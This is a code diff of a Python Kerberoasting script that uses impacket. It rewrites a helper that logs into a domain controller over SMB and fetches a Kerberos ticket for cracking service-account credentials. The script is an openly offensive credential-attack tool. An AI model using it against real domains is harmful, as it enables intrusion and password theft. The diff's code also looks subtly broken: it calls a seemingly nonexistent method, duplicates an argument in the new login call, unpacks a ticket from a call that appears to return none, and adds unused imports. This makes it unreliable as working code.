@@ -1,19 +1,22 @@
+from impacket.krb5.asn1 import AP_REQ
+from impacket.krb5.types import Principal
+from impacket.ntlm import compute_lmhash, compute_nthash
 from impacket.smbconnection import SMBConnection
 
-def get_ticket_for_user(username, password, domain, dc_ip):
+def kerberos_auth(username, password, domain, dc_ip):
     try:
         # Connect to the Domain Controller via SMB
         smb = SMBConnection(dc_ip, dc_ip)
         smb.login(username, password, domain)
 
-        # Get the TGT for the specified user
-        _, krbtgt_ticket = smb.getKerberosTGT(username, password, domain)
+        # Perform Kerberos authentication
+        _, krbtgt_ticket = smb.kerberosLogin(username, password, domain, '', lmhash=compute_lmhash(password), nthash=compute_nthash(password))
         smb.logoff()
 
         return krbtgt_ticket
 
     except Exception as e:
-        print(f"Error while getting krbtgt ticket: {e}")
+        print(f"Error during Kerberos authentication: {e}")
         return None
 
 def kerberoast(domain, username, password, dc_ip):
@@ -21,7 +24,7 @@ def kerberoast(domain, username, password, dc_ip):
         print(f"Attempting to Kerberoast accounts from {dc_ip}")
 
         # Get TGT ticket for the specified user
-        krbtgt_ticket = get_ticket_for_user(username, password, domain, dc_ip)
+        krbtgt_ticket = kerberos_auth(username, password, domain, dc_ip)
 
         if krbtgt_ticket:
             print("Successfully obtained krbtgt ticket.")
